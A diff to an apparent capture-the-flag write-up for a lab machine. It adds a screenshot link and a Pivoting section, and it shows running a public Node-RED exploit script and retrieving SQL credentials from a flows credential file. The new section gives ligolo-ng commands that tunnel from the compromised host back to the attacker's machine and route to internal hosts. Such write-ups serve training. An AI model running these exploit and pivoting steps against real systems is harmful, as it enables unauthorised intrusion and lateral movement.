@@ -12,11 +12,12 @@ Open 10.10.185.167:1880
 
 * Node-red web service can be exploited via [noderedsh.py](https://gist.githubusercontent.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297/raw/8966e4ee07400f16b92737161ca8df3cbfa37f91/noderedsh.py)
 
+![image](https://github.com/reneanto/write-ups/assets/44943249/5def2930-6800-4a94-a52e-0a938e3747ed)
 ```bash
 python3 noderedsh.py http://$IP:1080 --user "" --password ""
 ```
 
-![nodered-svc](../Images/tengu-nodered.png)
+![nodered-svc](tengu-nodered.png)
 
 ### nodered_svc
 
@@ -38,3 +39,23 @@ jq  '.["$"]' -j $1/flows_cred.json | \
 ```
 
 * upon running this we get the sql credentials that were found in the web application
+## Pivoting
+
+* navigate to /tmp on nodered as a good practice
+* then use `ligolo-ng` to pivot
+
+```bash
+#on attacker machine
+sudo ip tuntap add user rzgami mode tun ligolo
+sudo ip link set ligolo up
+./proxy --selfcert
+
+#on nodered
+./agent -connect $IP:11601 -ignore-cert
+
+#on attacker machine
+ligolo-ng>session
+sudo ip route add 10.10.x.230/32 dev ligolo
+sudo ip route add 10.10.x.229/32 dev ligolo
+ligolo-ng>start
+```
